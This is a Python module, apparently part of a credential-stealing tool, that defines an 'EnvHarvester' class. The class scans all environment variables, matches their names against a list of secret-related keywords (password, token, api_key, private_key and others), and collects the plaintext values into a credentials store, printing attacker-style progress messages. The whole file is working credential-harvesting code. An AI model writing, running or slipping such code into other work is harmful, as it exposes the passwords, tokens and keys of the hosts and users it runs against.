"""
Environment variable harvesting
"""

import os


class EnvHarvester:
    """Harvest credentials from environment variables"""
    
    SENSITIVE_PATTERNS = [
        'password', 'passwd', 'pwd', 'secret', 'token', 'api_key',
        'access_key', 'private_key', 'auth'
    ]
    
    def __init__(self, credentials: dict):
        self.credentials = credentials
    
    def harvest(self):
        """Check environment variables for credentials"""
        print("\n[*] Checking environment variables...")
        
        env_vars = dict(os.environ)
        found_count = 0
        
        for var_name, var_value in env_vars.items():
            if self._is_sensitive(var_name):
                self.credentials['passwords'].append({
                    'source': 'Environment Variable',
                    'type': 'ENV',
                    'variable': var_name,
                    'credential': var_value
                })
                found_count += 1
                print(f"  [+] Found sensitive variable: {var_name}")
        
        print(f"  [*] Found {found_count} sensitive environment variables")
    
    def _is_sensitive(self, var_name: str) -> bool:
        """Check if variable name indicates sensitive data"""
        var_lower = var_name.lower()
        return any(pattern in var_lower for pattern in self.SENSITIVE_PATTERNS)
